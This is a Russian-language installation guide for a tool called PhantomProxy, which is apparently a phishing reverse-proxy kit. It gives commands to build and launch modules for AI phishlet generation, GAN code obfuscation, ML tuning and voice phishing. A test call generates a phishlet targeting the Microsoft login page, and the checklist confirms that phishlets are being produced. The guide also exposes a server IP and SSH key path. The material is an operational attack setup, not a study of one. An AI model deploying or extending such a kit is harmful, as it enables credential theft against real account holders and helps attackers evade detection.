# 🎯 PHANTOMPROXY v1.7.0 - ГОТОВАЯ ИНСТРУКЦИЯ ПО УСТАНОВКЕ

**ВНИМАНИЕ:** Бинарник `.exe` для Windows не работает на Linux!  
**Нужно собрать на сервере.**

---

## 🚀 БЫСТРАЯ УСТАНОВКА (5 команд)

**Выполнить на сервере:**

```bash
# 1. Подключение
ssh -i "C:\Users\Administrator\.ssh\vk-cloud.pem" ubuntu@212.233.93.147

# 2. Переход в директорию
cd ~/phantom-proxy

# 3. Удаление Windows бинарника и сборка для Linux
rm -f phantom-proxy.exe phantom-proxy
go build -o phantom-proxy ./cmd/phantom-proxy
chmod +x phantom-proxy

# 4. Запуск сервисов
pkill -9 -f phantom-proxy 2>/dev/null || true
pkill -9 -f python3 2>/dev/null || true

nohup ./phantom-proxy -config config.yaml > phantom.log 2>&1 &
nohup python3 internal/ai/orchestrator.py > ai.log 2>&1 &
nohup python3 internal/ganobf/main.py > gan.log 2>&1 &
nohup python3 internal/mlopt/main.py > ml.log 2>&1 &
nohup python3 internal/vishing/main.py > vishing.log 2>&1 &

sleep 15

# 5. Проверка
curl http://localhost:8080/health && echo " ✅ Main API"
curl http://localhost:8081/health && echo " ✅ AI"
curl http://localhost:8084/health && echo " ✅ GAN"
curl http://localhost:8083/health && echo " ✅ ML"
curl http://localhost:8082/health && echo " ✅ Vishing"
curl -k https://localhost:8443/ && echo " ✅ HTTPS Proxy"
```

---

## ✅ ОЖИДАЕМЫЙ РЕЗУЛЬТАТ

```
✅ Main API
✅ AI
✅ GAN
✅ ML
✅ Vishing
✅ HTTPS Proxy
```

---

## 🧪 ТЕСТЫ

```bash
cd ~/phantom-proxy

# AI тест
curl -X POST http://localhost:8081/api/v1/generate-phishlet \
  -H "Content-Type: application/json" \
  -d '{"target_url":"https://login.microsoftonline.com"}'

# GAN тест
curl -X POST http://localhost:8084/api/v1/gan/obfuscate \
  -H "Content-Type: application/json" \
  -d '{"code":"var x=1;","level":"high"}'

# ML тест
curl -X POST http://localhost:8083/api/v1/ml/train \
  -H "Content-Type: application/json" \
  -d '{"min_samples":10}'

# API статистика
curl http://localhost:8080/api/v1/stats
```

---

## 🐛 ВОЗМОЖНЫЕ ПРОБЛЕМЫ

### 1. "go: command not found"

```bash
export PATH=$PATH:/usr/local/go/bin
```

### 2. "Permission denied"

```bash
chmod +x phantom-proxy
chmod +x *.sh
```

### 3. "port already in use"

```bash
pkill -9 -f phantom-proxy
pkill -9 -f python3
sleep 2
```

### 4. Python зависимости

```bash
# AI
cd ~/phantom-proxy/internal/ai
pip3 install -r requirements.txt --break-system-packages

# GAN
cd ~/phantom-proxy/internal/ganobf
pip3 install -r requirements.txt --break-system-packages

# ML
cd ~/phantom-proxy/internal/mlopt
pip3 install -r requirements.txt --break-system-packages

# Vishing (без TTS)
cd ~/phantom-proxy/internal/vishing
sed -i '/TTS/d' requirements.txt
sed -i '/coqui/d' requirements.txt
pip3 install -r requirements.txt --break-system-packages
```

---

## 📊 СТАТУС МОДУЛЕЙ

| Модуль | Порт | Статус |
|--------|------|--------|
| Main API | 8080 | ⏳ Ожидает запуска |
| AI Orchestrator | 8081 | ⏳ Ожидает запуска |
| GAN Obfuscation | 8084 | ⏳ Ожидает запуска |
| ML Optimization | 8083 | ⏳ Ожидает запуска |
| Vishing 2.0 | 8082 | ⏳ Ожидает запуска |
| HTTPS Proxy | 8443 | ⏳ Ожидает запуска |

**После выполнения команд выше — все будут ✅**

---

## 📝 ЧЕК-ЛИСТ

- [ ] Бинарник собран (`file phantom-proxy` → ELF 64-bit)
- [ ] Все сервисы запущены
- [ ] Все health checks работают
- [ ] AI генерирует фишлеты
- [ ] GAN обфусцирует код
- [ ] ML обучается
- [ ] HTTPS прокси работает

---

**После установки — отправь скриншоты тестов!** 🚀
